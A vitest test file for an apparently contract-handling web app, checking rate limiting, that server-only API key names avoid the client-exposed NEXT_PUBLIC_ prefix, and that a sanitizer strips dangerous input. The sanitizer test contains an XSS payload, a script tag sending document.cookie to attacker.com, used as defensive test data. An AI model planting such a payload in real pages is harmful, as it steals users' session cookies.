import { describe, it, expect } from 'vitest';
import { checkRateLimit } from '../src/lib/security/rate-limiter';
import { sanitizeContractText } from '../src/lib/ai/security-guard';

describe('7. Security, Auth & Secret Isolation', () => {
  it('should enforce rate limits and block excessive requests', () => {
    const testIp = 'test-ip-' + Math.random().toString();
    const options = { limit: 5, windowMs: 10000 };

    // First 5 requests must be allowed
    for (let i = 0; i < 5; i++) {
      const res = checkRateLimit(testIp, options);
      expect(res.allowed).toBe(true);
    }

    // 6th request must be blocked
    const blockedRes = checkRateLimit(testIp, options);
    expect(blockedRes.allowed).toBe(false);
    expect(blockedRes.remaining).toBe(0);
    expect(blockedRes.resetMs).toBeGreaterThan(0);
  });

  it('should isolate private environment keys from client bundles', () => {
    const serverOnlyKeys = [
      'GEMINI_API_KEY',
      'GOOGLE_GENERATIVE_AI_API_KEY',
      'SUPABASE_SERVICE_ROLE_KEY',
    ];

    for (const key of serverOnlyKeys) {
      // Must NOT start with NEXT_PUBLIC_ which would leak to client
      expect(key.startsWith('NEXT_PUBLIC_')).toBe(false);
    }

    const publicKeys = [
      'NEXT_PUBLIC_SUPABASE_URL',
      'NEXT_PUBLIC_SUPABASE_ANON_KEY',
    ];

    for (const key of publicKeys) {
      expect(key.startsWith('NEXT_PUBLIC_')).toBe(true);
    }
  });

  it('should sanitize dangerous HTML tags and null bytes from input contracts', () => {
    const evil = 'Contract <script>fetch("https://attacker.com/leak?cookie=" + document.cookie)</script> Agreement \0';
    const cleaned = sanitizeContractText(evil);

    expect(cleaned).not.toContain('<script>');
    expect(cleaned).not.toContain('</script>');
    expect(cleaned).not.toContain('attacker.com');
    expect(cleaned).not.toContain('\0');
    expect(cleaned).toContain('Contract');
    expect(cleaned).toContain('Agreement');
  });
});
